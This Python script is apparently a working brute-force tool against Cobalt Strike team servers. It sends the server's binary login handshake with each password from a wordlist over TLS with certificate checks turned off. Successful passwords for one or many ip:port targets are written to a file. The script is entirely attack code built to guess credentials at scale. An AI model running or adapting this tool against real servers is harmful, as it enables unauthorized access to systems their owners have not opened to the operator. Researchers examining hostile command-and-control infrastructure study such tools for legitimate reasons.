import concurrent.futures
import gevent
import ssl
import socket
import os
import argparse

class CheckCobalStrikePassword(object):
    def __init__(self,ip,port,thread):
        self.ip=ip
        self.port=port
        self.thread=thread
        self.passwords=[]
        self.iplist=[]

    def run(self,id=''):
        if id=='':
            with concurrent.futures.ProcessPoolExecutor(max_workers=self.thread) as execter:
                execter.map(self.login,self.passwords)
        else:
            for k in self.iplist:
                idata=str(k).split(":")
                ip=idata[0]
                port=int(idata[1])
                for pwd in self.passwords:
                    with concurrent.futures.ThreadPoolExecutor(max_workers=self.thread) as execter2:
                        execter2.submit(self.login,pwd,ip,port)


    def readfile(self,file,id=''):
        if os.path.exists(file):
            with open(file,"r",encoding="utf-8") as data:
                for r in data.readlines():
                    if id=='':
                        self.passwords.append(r.rstrip())
                    else:
                        self.iplist.append(r.rstrip())
        else:
            print("[File Error] Not Found File:{}".format(file))
            exit()


    def connect(self,host,port):
        self.ssl=ssl.SSLContext()
        self.ssl.verify_mode = ssl.CERT_NONE
        self.s=socket.socket()
        self.s.settimeout(10)
        self.ssls=self.ssl.wrap_socket(self.s)
        try:
            self.ssls.connect((host,port))
        except:
            print("[-] Connect {} failure".format(host))

    def login(self,password,ip="",port=""):
        if ip !="" and port!="":
            self.ip=ip
            self.port=port

        self.connect(self.ip,self.port)
        try:
            payload = bytearray(b"\x00\x00\xbe\xef") + len(password).to_bytes(1, "big", signed=True) + bytes(bytes(password, "ascii").ljust(256, b"A"))
            self.ssls.sendall(payload)
            calc=0
            buff=b""
            while calc<4:
                data = self.ssls.recv()
                buff+=data
                calc+=1

            if buff==b'\x00\x00\xca\xfe':
                print("[password] -> ip:{} port:{} pwd:{}".format(self.ip,self.port,password))
                print("[password] -> ip:{} port:{} pwd:{}".format(self.ip,self.port,password),file=open("save.txt","a",encoding="utf-8"))
            else:
                print("\r[ErrorPassword] -> {}  ".format(password),end="")
        except Exception as error:
            print(error)

            self.ssls.close()


if __name__ == '__main__':
    parser=argparse.ArgumentParser()
    parser.add_argument('-i','--ip',help='set rhost')
    parser.add_argument('-p','--port',help='set rport')
    parser.add_argument('-f','--file',help='set password file')
    parser.add_argument('-l','--iplist',help='set rhosts file,Example:test.txt -> 127.0.0.1:50050')
    parser.add_argument('-t','--thread',type=int,default=30,help='set thread/process,default:30')
    option=parser.parse_args()
    if option.ip and option.port and option.file and option.thread:
        ip=option.ip
        port=int(option.port)
        file=option.file
        process=option.thread
        obj = CheckCobalStrikePassword(ip,port,process)
        obj.readfile(file)
        print("[Connect] host:{} port:{}".format(ip,port))
        obj.run()

    elif option.iplist and option.file and option.thread:
        rhosts=option.iplist
        file=option.file
        thread=option.thread
        obj = CheckCobalStrikePassword("","",thread)
        obj.readfile(rhosts,id='1')
        obj.readfile(file)
        print("======>[    RHOSTS:{}  PWDS:{}    ]<=====".format(rhosts,file))
        obj.run(id='1')

    else:
        parser.print_help()
        print("Example:")
        print("python test2.py -i 127.0.0.1 -p 50050 -f password.txt -t 60")
        print("python test2.py -l ip.txt -f password.txt -t 60")

